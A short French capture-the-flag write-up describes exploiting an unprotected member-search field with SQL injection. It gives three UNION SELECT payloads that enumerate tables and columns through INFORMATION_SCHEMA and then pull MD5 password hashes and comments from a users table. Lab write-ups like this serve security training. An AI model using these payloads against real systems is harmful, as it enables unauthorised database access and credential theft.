Sur la page de recherche de membre, l'input n'est pas protégé contre les injections SQL.
La commande `1 UNION SELECT table_name, table_schema FROM INFORMATION_SCHEMA.COLUMNS --` permet de récupérer la liste des tables ainsi que la DB correspondante.
Une seconde requete `1 UNION SELECT table_name, column_name FROM INFORMATION_SCHEMA.COLUMNS  --` liste toutes les colonnes.
A partir de ces informations, nous allons requêter dans la db Member_Sql_Injection, la table users : `1 UNION SELECT countersign, Commentaire FROM Member_Sql_Injection.users --`
Nous obtenons des mots de passe hasher en MD5, et des commentaires, dont l'un donne des instructions pour obtenir le flag.
